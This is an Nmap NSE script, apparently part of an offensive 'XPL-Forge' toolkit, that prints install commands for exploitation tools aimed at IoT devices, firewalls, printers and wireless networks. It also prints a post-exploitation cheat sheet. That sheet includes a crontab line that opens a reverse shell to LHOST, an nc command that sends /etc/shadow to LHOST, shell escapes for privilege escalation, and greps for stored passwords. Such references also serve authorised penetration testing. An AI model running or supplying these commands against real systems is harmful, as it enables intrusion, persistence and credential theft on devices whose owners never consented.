-- embedxpl-suite-ref.nse
-- EmbedXPL-Forge NSE Script -- XPL-Forge Suite Quick Reference
--
-- Author : Andre Henrique (@mrhenrike) | Uniao Geek -- https://github.com/Uniao-Geek
-- Version: 1.0.0
-- License: Same as Nmap -- See https://nmap.org/book/man-legal.html
--
-- DESCRIPTION:
--   Reference-only script. Does not probe the target. Prints the full XPL-Forge
--   suite installation guide and post-exploitation reference (GTFOBins) for the
--   identified host type.
--
--   XPL-Forge Suite:
--     EmbedXPL-Forge   -- IoT/perimeter broad (routers, cameras, NAS, printers,
--                          firewalls): pip install embedxpl && embedxpl
--     FirewallXPL-Forge -- Firewall/VPN/UTM specialist (Fortinet, Cisco, PAN-OS,
--                          SonicWall, Check Point, Juniper):
--                          pip install firewallxpl && fxf
--     PrinterXPL-Forge  -- Network printer specialist (PJL, PostScript, PCL,
--                          SNMP, IPP, 185 modules):
--                          pip install printerxpl-forge && printerxpl-forge
--     WirelessXPL-Forge -- Wireless attacks (Wi-Fi, BLE, Zigbee, RFID, rogue AP):
--                          pip install wirelessxpl && wxf
--     MikrotikAPI-BF    -- MikroTik RouterOS specialist (100+ CVE, MAC-layer,
--                          credential brute-force):
--                          pip install mikrotikapi-bf && mikrotik-bf
--
--   Post-exploitation:
--     GTFOBins (embedded Linux): https://gtfobins.github.io
--     Focus: sudo abuse, SUID, BusyBox escape, cron persistence, NVRAM creds
--
-- USAGE:
--   nmap --script embedxpl-suite-ref <target>
--   nmap --script embedxpl-suite-ref --script-args suite.show_gtfobins=1 <target>

local stdnse = require "stdnse"
local nmap   = require "nmap"

description = [[
Prints the full XPL-Forge suite installation and usage reference without
probing the target. Use after any embedxpl-* script to get the exploitation
workflow for the identified device type.
]]

author     = "Andre Henrique (@mrhenrike) | Uniao Geek"
license    = "Same as Nmap -- See https://nmap.org/book/man-legal.html"
categories = { "safe", "discovery" }

portrule = function(host, port)
  return port.protocol == "tcp"
end

-- ── XPL-Forge Suite reference ─────────────────────────────────────────────

local SUITE = {
  {
    name    = "EmbedXPL-Forge",
    cli     = "embedxpl",
    pip     = "pip install embedxpl",
    repo    = "https://github.com/mrhenrike/EmbedXPL-Forge",
    scope   = "IoT broad: routers, cameras, NAS, firewalls, printers, GPON, ICS",
    nse     = "embedxpl-camera-identify, embedxpl-router-vuln, embedxpl-iot-cve-check",
  },
  {
    name    = "FirewallXPL-Forge",
    cli     = "fxf",
    pip     = "pip install firewallxpl",
    repo    = "https://github.com/mrhenrike/FirewallXPL-Forge",
    scope   = "Perimeter: Fortinet, Cisco ASA/FTD/IOS-XE, PAN-OS, SonicWall, Check Point, Juniper, Ivanti, Citrix, F5, Barracuda",
    nse     = "embedxpl-perimeter-vuln",
  },
  {
    name    = "PrinterXPL-Forge",
    cli     = "printerxpl-forge",
    pip     = "pip install printerxpl-forge",
    repo    = "https://github.com/mrhenrike/PrinterXPL-Forge",
    scope   = "Printers: HP, Canon, Lexmark, Xerox, Ricoh, CUPS -- PJL, PostScript, PCL, IPP, SNMP",
    nse     = "embedxpl-printer-vuln",
  },
  {
    name    = "WirelessXPL-Forge",
    cli     = "wxf",
    pip     = "pip install wirelessxpl",
    repo    = "https://github.com/mrhenrike/WirelessXPL-Forge",
    scope   = "Wireless: Wi-Fi (WPA/WPA3), BLE, Zigbee, RFID, rogue AP, ESP32 lab",
    nse     = "(wireless APs detected by embedxpl-iot-cve-check)",
  },
  {
    name    = "MikrotikAPI-BF",
    cli     = "mikrotik-bf",
    pip     = "pip install mikrotikapi-bf",
    repo    = "https://github.com/mrhenrike/MikrotikAPI-BF",
    scope   = "MikroTik RouterOS: 100+ CVE/EDB exploits, MAC-layer, 8-phase audit, credential BF",
    nse     = "embedxpl-router-vuln (MikroTik section)",
  },
}

-- ── GTFOBins quick reference for embedded Linux ───────────────────────────

local GTFOBINS_QUICK = {
  "SUID scan    : find / -perm -4000 -ls 2>/dev/null",
  "Sudo check   : sudo -l",
  "Capabilities : getcap -r / 2>/dev/null",
  "BusyBox esc  : busybox sh",
  "Python esc   : python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'",
  "awk sudo esc : sudo awk 'BEGIN {system(\"/bin/sh\")}'",
  "find SUID    : find . -exec /bin/sh -p \\; -quit",
  "Cron persist : echo '* * * * * bash -i >& /dev/tcp/LHOST/PORT 0>&1'|crontab -",
  "NVRAM creds  : nvram show 2>/dev/null | grep -i pass",
  "OpenWrt creds: uci show | grep -i pass",
  "Exfil (nc)   : nc LHOST PORT < /etc/shadow",
  "GTFOBins ref : https://gtfobins.github.io",
  "BusyBox ref  : https://gtfobins.github.io/gtfobins/busybox/",
}

action = function(host, port)
  local output = stdnse.output_table()

  output["XPL-Forge Suite"] = "Full post-exploitation framework for IoT, perimeter, printer, and wireless devices"

  for i, tool in ipairs(SUITE) do
    local key = ("%d. %s"):format(i, tool.name)
    output[key] = ("%s | %s | %s | scope: %s"):format(
      tool.pip, tool.cli, tool.repo, tool.scope
    )
  end

  local show_gtfo = stdnse.get_script_args("suite.show_gtfobins")
  if show_gtfo or true then  -- always show on first run
    output["Post-Exploitation (GTFOBins)"] = "Embedded Linux / IoT techniques:"
    for _, tip in ipairs(GTFOBINS_QUICK) do
      local idx = tip:match("^(.-)%s*:")
      if idx then
        output["  gtfo." .. idx:gsub("%s+", "_"):lower()] = tip
      end
    end
  end

  output["Full cheatsheet"] = "Run: embedxpl > shell_type=auto; after session: GTFOBins tips printed automatically"

  return output
end
